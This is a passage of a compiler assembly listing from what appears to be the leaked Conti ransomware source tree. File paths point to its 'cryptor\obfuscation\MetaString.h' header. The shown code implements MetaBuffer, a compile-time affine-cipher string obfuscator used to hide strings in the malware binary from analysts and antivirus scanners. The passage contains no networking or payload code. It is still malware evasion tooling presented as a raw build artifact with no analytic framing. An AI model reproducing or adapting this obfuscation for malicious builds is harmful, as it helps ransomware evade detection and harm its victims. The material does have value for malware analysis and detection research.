  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	b8 01 00 00 00	 mov	 eax, 1
  00477	48 6b c0 1a	 imul	 rax, rax, 26
  0047b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00482	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00486	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0048d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  00492	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00499	88 41 1b	 mov	 BYTE PTR [rcx+27], al
  0049c	b8 01 00 00 00	 mov	 eax, 1
  004a1	48 6b c0 1b	 imul	 rax, rax, 27
  004a5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004ac	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004b7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  004bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004c3	88 41 1c	 mov	 BYTE PTR [rcx+28], al
  004c6	b8 01 00 00 00	 mov	 eax, 1
  004cb	48 6b c0 1c	 imul	 rax, rax, 28
  004cf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004d6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004e1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  004e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004ed	88 41 1d	 mov	 BYTE PTR [rcx+29], al
  004f0	b8 01 00 00 00	 mov	 eax, 1
  004f5	48 6b c0 1d	 imul	 rax, rax, 29
  004f9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00500	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00504	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0050b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  00510	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00517	88 41 1e	 mov	 BYTE PTR [rcx+30], al
  0051a	b8 01 00 00 00	 mov	 eax, 1
  0051f	48 6b c0 1e	 imul	 rax, rax, 30
  00523	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0052a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0052e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00535	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  0053a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00541	88 41 1f	 mov	 BYTE PTR [rcx+31], al
  00544	b8 01 00 00 00	 mov	 eax, 1
  00549	48 6b c0 1f	 imul	 rax, rax, 31
  0054d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00554	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00558	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0055f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
  00564	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0056b	88 41 20	 mov	 BYTE PTR [rcx+32], al
  0056e	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00575	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00579	88 85 c0 00 00
	00		 mov	 BYTE PTR tv322[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  0057f	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00586	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0058d	5f		 pop	 rdi
  0058e	5d		 pop	 rbp
  0058f	c3		 ret	 0
??0?$MetaBuffer@$0EJ@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::MetaBuffer<73,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 26	 sub	 eax, 38			; 00000026H
  0002d	6b c0 13	 imul	 eax, eax, 19
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 6b	 imul	 eax, eax, 107		; 0000006bH
  0002d	83 c0 26	 add	 eax, 38			; 00000026H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 04	 cmp	 QWORD PTR i$1[rbp], 4
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$0CG@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<107,38,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
